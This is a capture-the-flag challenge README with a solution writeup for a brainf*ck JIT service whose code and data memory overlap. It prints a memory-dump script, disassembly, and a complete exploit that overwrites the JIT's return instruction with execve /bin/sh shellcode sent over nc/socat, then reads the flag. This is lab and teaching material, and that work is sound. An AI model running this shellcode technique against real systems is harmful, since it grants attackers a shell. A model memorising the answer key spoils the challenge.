# LeJIT

```text
We're taking a whole new way of looking at brainf*ck. Go and check it out!

nc 172.17.0.2 31337
```

The binaries or source code will not be provided with this problem.

## Setup

1. `docker build -t lejit .`
2. `docker run --rm -d --read-only lejit`

## Brief Dev Description

JIT compiler for brainf*ck, but the execution tape shares a memory map with the memory tape.

## Solution

Using your preferred shellcode (MUST be null-terminated):

```shell script
(echo "<<<<<<<<<<<<<,[>,]"; printf "\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05\x00"; sleep 1; echo "cat /root/flag.txt") | socat - tcp-connect:172.17.0.2:31337
```

## Short Writeup

We begin by exploring the memory tape, which shortly concludes that there are entries already
in the memory tape.

```
<.>  Go back, print, go forward
```

In order to explore this further, we write a short script to iterate up the address space:

```shell script
# print last 100 and remove the prompt and welcome text
python3 -c 'print("<"*100+".>"*100)' | socat - tcp-connect:172.17.0.2:31337 | xxd -p -c1 | tail -n 105 | head -n 100 | xxd -p -r > mem.bin
```

After some iterations of this, it becomes clear that this contains some arbitrary data. Knowing
this is a JIT compiler, we try objdump:

```shell script
objdump -D -b binary -mi386:x86-64 mem.bin
```

Which shows some somewhat expected behaviour for brainfuck JIT:

```text
0000000000000000 <.data>:
   0:	74 24                	je     0x26
   2:	38 48 89             	cmp    %cl,-0x77(%rax)
   5:	54                   	push   %rsp
   6:	24 40                	and    $0x40,%al
   8:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   d:	48 b8 d0 8e ed 63 1a 	movabs $0x561a63ed8ed0,%rax
  14:	56 00 00 
  17:	ff d0                	callq  *%rax
  19:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
  1e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
  23:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
  28:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
  2d:	3c 00                	cmp    $0x0,%al
  2f:	0f 85 23 00 00 00    	jne    0x58
  35:	48 81 c6 01 00 00 00 	add    $0x1,%rsi
  3c:	48 3b f1             	cmp    %rcx,%rsi
  3f:	0f 82 07 00 00 00    	jb     0x4c
  45:	48 81 ee 00 80 00 00 	sub    $0x8000,%rsi
  4c:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
  53:	48 83 c4 28          	add    $0x28,%rsp
  57:	c3                   	retq   
  58:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
  5f:	48 83 c4 28          	add    $0x28,%rsp
  63:	c3                   	retq
```

From this, we can discern a few things:
 - `%rsi` is the tape pointer (as shown by instruction at 0x35 and given the script used)
 - A function is used to output the character under the pointer (instruction at 0x17)
 - It is likely that the instruction at 0x57 is the means by which the JIT function normally returns (`%rax` is linux
 calling convention for return value, which is set to 0 at 0x4c)

By this, we know to make an attack where we overwrite the standard return with our shellcode.

The following BF payload is used (with a newline terminator):

```
<<<<<<<<<<<<<,[>,]
```

This moves back 13 (to retq) and overwrites it with input until encountering a null value.

[This shellcode](https://www.exploit-db.com/exploits/42179) is used (note the null terminator):

```
\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05\x00
```

Finally, these are combined to create our exploit:

```shell script
(echo "<<<<<<<<<<<<<,[>,]"; printf "\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x0F\x05\x00"; cat -) | nc 172.17.0.2 31337
```

With our shell, we read the flag:

```shell script
cat /root/flag.txt
```

With which we acquire the flag.

## Possible Difficulty Enhancements

 - It is entirely possible to solve this challenge entirely without source code or binaries,
   but if this proves to be too difficult, then we'll give them the binary.
